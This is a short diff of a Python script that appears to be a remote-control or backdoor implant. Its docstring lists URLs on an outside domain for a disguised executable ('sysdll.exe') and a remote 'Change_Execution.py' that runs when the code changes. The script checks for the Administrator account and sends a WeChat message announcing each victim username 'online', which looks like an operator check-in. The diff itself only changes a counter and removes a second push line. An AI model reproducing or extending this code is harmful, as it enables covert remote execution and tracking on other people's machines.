@@ -1,5 +1,5 @@
 """
-代码有变化就执行2158
+代码有变化就执行2228
 https://yc.052024.xyz/xz/sysdll.exe
 https://yc.052024.xyz/Control_files/Change_Execution.py
 """
@@ -112,4 +112,3 @@ if sys_username == 'Administrator':
     # start_cmd('start cmd')
     ...
 wechat_push.Alleged_information(f'{sys_username}上线')
-wechat_push.Alleged_information(f'{sys_username}cs')
